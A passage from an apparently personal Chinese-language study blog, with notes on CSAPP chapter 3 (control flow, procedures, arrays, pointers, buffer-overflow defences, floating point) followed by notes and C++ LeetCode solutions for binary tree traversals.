<li><p><img src="/2023/10/18/CSAPP-3-textbook/image-20231022152329363.png" alt="set 例子"></p>
</li>
</ul>
<h3 id="3-6-3-跳转指令"><a href="#3-6-3-跳转指令" class="headerlink" title="3.6.3 跳转指令"></a>3.6.3 跳转指令</h3><ul>
<li>跳转jump指令会导致执行切换到程序中一个全新的位置，跳转的目的通常用一个标号 label 指明<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022153207723.png" alt="jump示例"></li>
</ul>
</li>
<li>jmp指令是无条件跳转<ul>
<li>它可以直接跳转，即跳转的目标是作为指令的一部分编码的 即 jpm .L1</li>
<li>也可以是间接跳转，即跳转的目标是从寄存器或内存位置中读出的。 <ul>
<li>寄存器：jmp *(&amp;rax)</li>
<li>内存操作数：jmp *%rax</li>
</ul>
</li>
</ul>
</li>
<li>当执行PC相对寻址时，程序计数器的值是跳转指令<strong>后面</strong>那条指令的地址</li>
</ul>
<h3 id="3-6-5-用条件控制来实现条件分支"><a href="#3-6-5-用条件控制来实现条件分支" class="headerlink" title="3.6.5 用条件控制来实现条件分支"></a>3.6.5 用条件控制来实现条件分支</h3><ul>
<li>if - else  汇编实现方式：<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022161116115.png" alt="image-20231022161116115"></li>
</ul>
</li>
</ul>
<h3 id="3-6-6-用条件传送来实现条件分支"><a href="#3-6-6-用条件传送来实现条件分支" class="headerlink" title="3.6.6 用条件传送来实现条件分支"></a>3.6.6 用条件传送来实现条件分支</h3><ul>
<li>实现条件操作的传统方法 是通过使用<strong>控制</strong>的条件转移， 即当条件满足时，程序沿着一条路执行路径，不满足时沿着另一条</li>
<li>一种替代方式是使用数据的条件转移，这种方式是计算一个条件操作的两种结果，然后再根据条件是否满足选取一个</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022162040679.png" alt="用数值转移例子"></li>
<li>因为CPU会预测哪个程序应该接下来执行，哪个不会，会预先加载 或预测错误会浪费大量的时钟周期。</li>
<li>条件传送指令<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022162927260.png" alt="条件传送指令"></li>
</ul>
</li>
</ul>
<h3 id="3-6-7-循环"><a href="#3-6-7-循环" class="headerlink" title="3.6.7 循环"></a>3.6.7 循环</h3><ul>
<li>汇编中没有相应的指令存在，但可以用<strong>条件测试</strong>和<strong>跳转组合</strong>起来实现循环效果<ul>
<li><strong><img src="/2023/10/18/CSAPP-3-textbook/image-20231022163203798.png" alt="do while"></strong></li>
</ul>
</li>
<li>while <ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022163414647.png" alt="while "></li>
</ul>
</li>
</ul>
<h3 id="3-6-8-switch语句"><a href="#3-6-8-switch语句" class="headerlink" title="3.6.8 switch语句"></a>3.6.8 switch语句</h3><ul>
<li>执行switch语句的关键步骤是通过<strong>跳转表</strong>来访问代码位置。</li>
</ul>
<h2 id="3-7-过程"><a href="#3-7-过程" class="headerlink" title="3.7 过程"></a>3.7 过程</h2><h3 id="3-7-1-运行时栈"><a href="#3-7-1-运行时栈" class="headerlink" title="3.7.1 运行时栈"></a>3.7.1 运行时栈</h3><ul>
<li>C语言过程调用机制的一个关键特性在于使用了<strong>栈数据结构提供的后入先出的内存管理</strong>原则</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022164455873.png" alt="栈结构"></li>
<li>当前正在执行的过程的帧总是在栈顶</li>
</ul>
<h3 id="3-7-2-转移控制"><a href="#3-7-2-转移控制" class="headerlink" title="3.7.2 转移控制"></a>3.7.2 转移控制</h3><ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022164803893.png" alt="image-20231022164803893"></li>
<li>call函数调用可以是直接的也可以是间接的<ul>
<li>直接调用的目标时一个标号</li>
<li>间接调用的目标是 *后面跟一个操作数指示符</li>
</ul>
</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022165857340.png" alt="例子"></li>
</ul>
<h3 id="3-7-3-数据传送"><a href="#3-7-3-数据传送" class="headerlink" title="3.7.3 数据传送"></a>3.7.3 数据传送</h3><ul>
<li>大部分过程间的数据传送是通过寄存器实现的</li>
<li>x86-64 中通过寄存器最多可以传递6个整型参数<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022170439146.png" alt="寄存器"></li>
</ul>
</li>
<li>如果一个函数有大于6个整型参数，超出6个的部分就要通过栈来传递，把7~n个参数放到栈上<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022170715796.png" alt="image-20231022170715796"></li>
</ul>
</li>
</ul>
<h3 id="3-7-4-栈上的局部存储"><a href="#3-7-4-栈上的局部存储" class="headerlink" title="3.7.4 栈上的局部存储"></a>3.7.4 栈上的局部存储</h3><ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022170839706.png" alt="image-20231022170839706"></li>
<li>数据必须保存在栈中的情况如上</li>
</ul>
<h3 id="3-7-5-寄存器中的局部存储空间"><a href="#3-7-5-寄存器中的局部存储空间" class="headerlink" title="3.7.5 寄存器中的局部存储空间"></a>3.7.5 寄存器中的局部存储空间</h3><ul>
<li>%rbx、%rbp和%12~%r15 被划分为<strong>被调用者</strong>保存寄存器：当过程P调用过程Q时，Q必须保存这些寄存器的值，保证它们的值在q返回时与q被调用时是一样的</li>
<li>其他所有寄存器 除了栈指针%rsp，都分类为<strong>调用者保存寄存器</strong>，意味着任何函数都可以修改它们</li>
</ul>
<h3 id="3-7-6-递归过程"><a href="#3-7-6-递归过程" class="headerlink" title="3.7.6 递归过程"></a>3.7.6 递归过程</h3><ul>
<li>递归调用一个函数本事与调用其他函数是一样的，栈规则提供了一种机制，每次函数调用都有它自己私有的状态信息（保存的返回值位置和被调用者保存寄存器的值）存储空间。</li>
</ul>
<h2 id="3-8-数组分配和访问"><a href="#3-8-数组分配和访问" class="headerlink" title="3.8 数组分配和访问"></a>3.8 数组分配和访问</h2><h3 id="3-8-1-基本原则"><a href="#3-8-1-基本原则" class="headerlink" title="3.8.1 基本原则"></a>3.8.1 基本原则</h3><ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022201058357.png" alt="数组元素定义"></li>
</ul>
<h3 id="3-8-2-指针运算"><a href="#3-8-2-指针运算" class="headerlink" title="3.8.2 指针运算"></a>3.8.2 指针运算</h3><ul>
<li>表达式Exper 与 *&amp;Exper是等价的</li>
<li>数组引用A[I] 等同于表达式*(A+i)</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022202227982.png" alt="image-20231022202227982"></li>
</ul>
<h3 id="3-8-3-嵌套数组"><a href="#3-8-3-嵌套数组" class="headerlink" title="3.8.3 嵌套数组"></a>3.8.3 嵌套数组</h3><ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022202429802.png" alt="image-20231022202429802"></li>
<li>也可以看成5行3列的二维数组，在内存中按照行优先的原则排雷<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022202608940.png" alt="image-20231022202608940"></li>
</ul>
</li>
</ul>
<h3 id="3-8-4-定长数组"><a href="#3-8-4-定长数组" class="headerlink" title="3.8.4 定长数组"></a>3.8.4 定长数组</h3><ul>
<li>当程序要用一个常数作为数组的维度或者缓冲区的大小时，最好通过<code>#define</code>声明将这个常数与一个名字联系起来。</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022203231362.png" alt="image-20231022203231362"></li>
</ul>
<h2 id="3-9-异质的数据结构"><a href="#3-9-异质的数据结构" class="headerlink" title="3.9 异质的数据结构"></a>3.9 异质的数据结构</h2><ul>
<li>c语言提供了两种将不同类型对象组合到一起创建数据类型的机制：<ul>
<li>结构（structure），用关键字struct来声明，将多个对象集合到一个单位中</li>
<li>联合（union），关键字union，允许用几种不同的类型来引用一个对象</li>
</ul>
</li>
</ul>
<h3 id="3-9-1-结构"><a href="#3-9-1-结构" class="headerlink" title="3.9.1 结构"></a>3.9.1 结构</h3><ul>
<li>结构的所有组成部分都存放在内存中一段连续的区域内，而<strong>指向结构的指针就是结构第一个字节的地址</strong></li>
<li>rp代表一个指针 那么（*rp）.width 等价于rp-&gt;width</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022204517874.png" alt="结构体的声明"></li>
</ul>
<h3 id="3-9-2-联合"><a href="#3-9-2-联合" class="headerlink" title="3.9.2 联合"></a>3.9.2 联合</h3><ul>
<li>允许多种类型来引用一个对象</li>
<li>一个联合的总的大小等于它最大字段的大小<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022204908132.png" alt="image-20231022204908132"></li>
<li>若事先知道一个数据结构中两个不同字段的使用时互斥的，那么将这个两个字段声明为联合的一部分，而不是结构的一部分，会减小分配空间的总量。</li>
</ul>
</li>
</ul>
<h3 id="3-9-3-数据对齐"><a href="#3-9-3-数据对齐" class="headerlink" title="3.9.3 数据对齐"></a>3.9.3 数据对齐</h3><ul>
<li>对齐数据可以提高内存系统的性能。</li>
<li>对齐原则是任何k字节的基本对象的地址必须是k的倍数</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022205926244.png" alt="image-20231022205926244"></li>
</ul>
<h2 id="3-10-在机器级程序中将控制与数据结合起来"><a href="#3-10-在机器级程序中将控制与数据结合起来" class="headerlink" title="3.10 在机器级程序中将控制与数据结合起来"></a>3.10 在机器级程序中将控制与数据结合起来</h2><h3 id="3-10-1理解指针"><a href="#3-10-1理解指针" class="headerlink" title="3.10.1理解指针"></a>3.10.1理解指针</h3><ul>
<li>每个指针都对应一个类型<ul>
<li>int *ip： ip是int类型指针</li>
<li>char **cpp ： cpp指向的对象自身就是一个指向char类型对象的指针</li>
</ul>
</li>
<li>每个指针都有一个值： 这个值是某个指定类型的对象地址</li>
<li>指针用<code>&amp;</code>运算符创建</li>
<li>*操作符用于间接引用指针：其结果就是一个值，间接引用时用内存引用来实现的，要么是存储到一个指定的地址，要么是从指定的地址读取</li>
<li>数组与指针密切联系</li>
<li><strong>将指针从一种类型强制换行成另一种类型，只改变它的类型，而不改变它的值</strong><ul>
<li>char *p &#x3D; <em>p</em>；(int *) (p + 7) &#x3D; <em>p</em>+7;</li>
</ul>
</li>
<li>指针也可以指向函数<ul>
<li><code>int fun (int x, int *p);</code></li>
<li>声明一个指针fp</li>
<li><code>int (*fp) (int, int *);</code></li>
<li><code>fp = fun</code></li>
<li>然后可以用这个指针调用这个函数</li>
<li><code>int y = 1；</code></li>
<li><code>int res = fp(3,&amp;y);</code></li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023152217590.png" alt="hanshu zhizhen"></li>
</ul>
</li>
</ul>
<h3 id="3-10-2-使用GDB调试器"><a href="#3-10-2-使用GDB调试器" class="headerlink" title="3.10.2 使用GDB调试器"></a>3.10.2 使用GDB调试器</h3><ul>
<li>GDB部分命令<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023152943015.png" alt="image-20231023152943015"></li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023153007070.png" alt="image-20231023153007070"></li>
</ul>
</li>
</ul>
<h3 id="3-10-3-内存越界引用和缓冲区溢出"><a href="#3-10-3-内存越界引用和缓冲区溢出" class="headerlink" title="3.10.3 内存越界引用和缓冲区溢出"></a>3.10.3 内存越界引用和缓冲区溢出</h3><ul>
<li>缓冲区溢出（buffer overflow）例如： 在栈中分配某个字符数组来保存一个字符串，但是字符串的长度超出了为分配数组分配的空间</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023153951615.png" alt="image-20231023153951615"></li>
</ul>
<h3 id="3-10-4-对抗缓冲区溢出"><a href="#3-10-4-对抗缓冲区溢出" class="headerlink" title="3.10.4 对抗缓冲区溢出"></a>3.10.4 对抗缓冲区溢出</h3><ol>
<li><strong>栈随机化</strong>：使得栈的位置在程序每次运行时都有变化。在Linux称呼为<strong>地址空间布局随机化</strong>。</li>
<li><strong>栈破坏检测：</strong>GCC在产生代码中加入了栈保护者的机制：即在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的<strong>金丝雀</strong>的值也叫做哨兵值，在恢复寄存器状态和从函数返回之前，程序会检测这个金丝雀值是否被该函数的某个操作改变了，如果是则终止程序。<ol>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023155203830.png" alt="image-20231023155203830"></li>
</ol>
</li>
<li><strong>限制可执行代码区域</strong>：一方面可以限制哪些内存区域才能存放可以执行的代码</li>
</ol>
<h3 id="3-10-5-支持变长栈帧"><a href="#3-10-5-支持变长栈帧" class="headerlink" title="3.10.5 支持变长栈帧"></a>3.10.5 支持变长栈帧</h3><ul>
<li>当用到边长数组时会用到<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023155823735.png" alt="image-20231023155823735"></li>
</ul>
</li>
<li>为了管理变成栈帧，x86-64使用寄存器**%rbp<strong>作为</strong>帧指针或基指针**<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023160205746.png" alt="**帧指针或基指针**"></li>
</ul>
</li>
</ul>
<h2 id="3-11-浮点代码"><a href="#3-11-浮点代码" class="headerlink" title="3.11 浮点代码"></a>3.11 浮点代码</h2><ul>
<li>media媒体寄存器 用于存放浮点数据<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023163859391.png" alt="image-20231023163859391"></li>
</ul>
</li>
</ul>
<h3 id="3-11-1-浮点传送和转换操作"><a href="#3-11-1-浮点传送和转换操作" class="headerlink" title="3.11.1 浮点传送和转换操作"></a>3.11.1 浮点传送和转换操作</h3><ul>
<li>引用内存的指令时标量指令，所以它们只对单个而不是一组封装好的数据值进行操作，数据要么保存在内存中（M32或M64）要么保存在XMM寄存器中（表中用X表示）<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023164339323.png" alt="image-20231023164339323"></li>
<li>vmovapd 指令中的a表示aligned 对齐</li>
</ul>
</li>
<li>浮点数和整数数据之间转换需要进行截断。其指令如下：<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023164645225.png" alt="浮点数和整数数据之间转换"></li>
</ul>
</li>
<li>整数转换成浮点数 使用三操作数格式，有两个源和一个目的，第一个操作数读取内存或一个通用目的的寄存器，第二个源可忽略移位只会影响结果的高位字节。<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023164958966.png" alt="整数转换成浮点数"></li>
</ul>
</li>
</ul>
<h3 id="3-11-2-过程中的浮点代码"><a href="#3-11-2-过程中的浮点代码" class="headerlink" title="3.11.2 过程中的浮点代码"></a>3.11.2 过程中的浮点代码</h3><ul>
<li>XMM寄存器%xmm0~%xmm7最多可以传递8个浮点参数</li>
<li>函数使用寄存器%xmm0 来返回浮点值</li>
<li><strong>所有XMM寄存器都是用调用者保存的</strong>，被调用者可以不用保存就覆盖这些寄存器中任意一个</li>
</ul>
<p>当函数包含指针、整数和浮点数时，指针和整数用通用寄存器传递，浮点数用XMM寄存器传递</p>
<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023165544955.png" alt="image-20231023165544955"></li>
</ul>
<h3 id="3-11-3-浮点运算操作"><a href="#3-11-3-浮点运算操作" class="headerlink" title="3.11.3 浮点运算操作"></a>3.11.3 浮点运算操作</h3><ul>
<li>第一个源操作数可以是一个XMM寄存器或一个内存位置；第二个源操作数和目的操作数必须都是XMM寄存器。<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023165759938.png" alt="image-20231023165759938"></li>
</ul>
</li>
</ul>
<h3 id="3-11-4-定义和使用浮点常数"><a href="#3-11-4-定义和使用浮点常数" class="headerlink" title="3.11.4 定义和使用浮点常数"></a>3.11.4 定义和使用浮点常数</h3><ul>
<li>AVX浮点操作不能以立即数数值作为操作数，而是编译器必须为所有的常量值分配和初始化存储空间。<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231023170011100.png" alt="image-20231023170011100"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树</title>
    <url>/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><ul>
<li>参考：<a href="https://programmercarl.com/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html#%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A7%8D%E7%B1%BB">代码随想录 (programmercarl.com)</a></li>
</ul>
<h2 id="1-1二叉树的种类"><a href="#1-1二叉树的种类" class="headerlink" title="1.1二叉树的种类"></a>1.1二叉树的种类</h2><ul>
<li>满二叉树<ul>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020100934713.png" alt="满二叉树"></li>
</ul>
</li>
<li>完全二叉树<ul>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020101141309.png" alt="完全二叉树"></li>
</ul>
</li>
<li>二叉搜索树：有数值、有序树<ul>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020101641589.png" alt="二叉搜索树"></li>
</ul>
</li>
<li>平衡二叉树<ul>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020101817920.png" alt="平衡二叉树"></li>
</ul>
</li>
<li>c++中 map、set、multimap、和multiset的底层实现都是<strong>平衡二叉搜索树</strong>——-&gt;所有其增删操作的时间复杂度是O(log n)。</li>
<li>但是<strong>unordered map 和unordered set 底层实现是哈希表</strong>。</li>
</ul>
<h2 id="1-2-存储方式"><a href="#1-2-存储方式" class="headerlink" title="1.2 存储方式"></a>1.2 存储方式</h2><ul>
<li>可以<strong>链式存储（用指针，在内存中分布在各个地方）</strong>，也可以<strong>顺序存储（用数组，在内存中是连续分布的）</strong><ul>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020102824147.png" alt="链式存储"></li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020102937349.png" alt="顺序存储"></li>
</ul>
</li>
</ul>
<h2 id="1-3-遍历方式"><a href="#1-3-遍历方式" class="headerlink" title="1.3 遍历方式"></a>1.3 遍历方式</h2><p>两种遍历方式：</p>
<ul>
<li>深度优先遍历：先往深处走，遇到叶子节点在回走<ul>
<li>前序遍历：递归、迭代 ——中间节点顺序中左右</li>
<li>中序遍历：递归、迭代 ——左中右</li>
<li>后续遍历：递归、迭代 ——左右中</li>
<li>可以借助栈使用递归的方式来实现</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020104308149.png" alt="深度优先遍历"></li>
</ul>
</li>
<li>广度优先遍历：每一层去遍历<ul>
<li>层次遍历：迭代</li>
<li>使用队列来实现</li>
</ul>
</li>
</ul>
<h2 id="1-4-二叉树的定义"><a href="#1-4-二叉树的定义" class="headerlink" title="1.4 二叉树的定义"></a>1.4 二叉树的定义</h2><p>链式存储的结构跟链表差不多</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span> (<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>),<span class="built_in">right</span>(<span class="literal">NULL</span>) &#123;&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h1 id="2-二叉树的递归遍历"><a href="#2-二叉树的递归遍历" class="headerlink" title="2.二叉树的递归遍历"></a>2.二叉树的递归遍历</h1><p><strong>题目：</strong></p>
<ul>
<li><a href="https://leetcode.cn/problems/binary-tree-preorder-traversal/description/">144. 二叉树的前序遍历 - 力扣（LeetCode）</a></li>
<li><a href="https://leetcode.cn/problems/binary-tree-postorder-traversal/description/">145. 二叉树的后序遍历 - 力扣（LeetCode）</a></li>
<li><a href="https://leetcode.cn/problems/binary-tree-inorder-traversal/description/">94. 二叉树的中序遍历 - 力扣（LeetCode）</a></li>
</ul>
<p><strong>思路：</strong></p>
<p>前序：中左右</p>
<ol>
<li>确定递归函数的参数和返回值<ol>
<li>一般来说返回值都是void</li>
</ol>
</li>
<li>确定终止条件<ol>
<li>cur&#x3D;&#x3D;NULL 遇到空节点</li>
</ol>
</li>
<li>确定单层递归的逻辑<ol>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231020113545945.png" alt="image-20231020113545945"></li>
</ol>
</li>
</ol>
<h2 id="2-1-leetcode-144-前序遍历-E"><a href="#2-1-leetcode-144-前序遍历-E" class="headerlink" title="2.1 leetcode -144-前序遍历-E"></a>2.1 leetcode -144-前序遍历-E</h2><p><strong>代码实现</strong>：递归的方法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span> <span class="params">(TreeNode* cur, vector&lt;<span class="type">int</span>&gt;&amp; vec)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//前序遍历：中左右</span></span><br><span class="line">        vec.<span class="built_in">push_back</span>(cur-&gt;val);<span class="comment">//中</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;left, vec);<span class="comment">//左节点传入</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;right, vec);<span class="comment">//右节点传入</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">traversal</span>(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) n为节点个数 吗，递归中每个节点恰好被遍历一次</li>
<li>空间复杂度：O(n) 返回数组</li>
</ul>
<h2 id="2-2-leetcode-145-后序遍历-E"><a href="#2-2-leetcode-145-后序遍历-E" class="headerlink" title="2.2 leetcode-145-后序遍历-E"></a>2.2 leetcode-145-后序遍历-E</h2><p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span><span class="params">(TreeNode* cur, vector&lt;<span class="type">int</span>&gt;&amp; res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//后序遍历:左右中</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;left, res);</span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;right, res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">traversal</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>同上</li>
</ul>
<h2 id="2-3-leetcode-94-二叉树中序遍历-E"><a href="#2-3-leetcode-94-二叉树中序遍历-E" class="headerlink" title="2.3 leetcode-94-二叉树中序遍历-E"></a>2.3 leetcode-94-二叉树中序遍历-E</h2><p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span><span class="params">(TreeNode* cur, vector&lt;<span class="type">int</span>&gt;&amp; res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//中序 左中右</span></span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;left, res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        <span class="built_in">traversal</span>(cur-&gt;right, res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="built_in">traversal</span>(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>同上</li>
</ul>
<h1 id="3-迭代遍历"><a href="#3-迭代遍历" class="headerlink" title="3.迭代遍历"></a>3.迭代遍历</h1><p>会考察简单递归的迭代法 ，实现前中后序遍历</p>
<p>递归—-都可以用栈模拟出来 </p>
<p>栈：先进后出  注意数据存入顺序！！！</p>
<h2 id="3-1-leetcode-144、145-前后序遍历-E"><a href="#3-1-leetcode-144、145-前后序遍历-E" class="headerlink" title="3.1 leetcode-144、145-前后序遍历-E"></a>3.1 leetcode-144、145-前后序遍历-E</h2><ul>
<li>先将右子节点入栈，再将左子节点入栈   即中右左</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;								  <span class="comment">//栈</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> result;</span><br><span class="line">        st.<span class="built_in">push</span>(root);										 <span class="comment">//传入根节点</span></span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>();                       <span class="comment">// 中 取出栈顶元素</span></span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            result.<span class="built_in">push_back</span>(node-&gt;val);					 <span class="comment">//放入数组</span></span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right) st.<span class="built_in">push</span>(node-&gt;right);           <span class="comment">// 右（空节点不入栈）</span></span><br><span class="line">            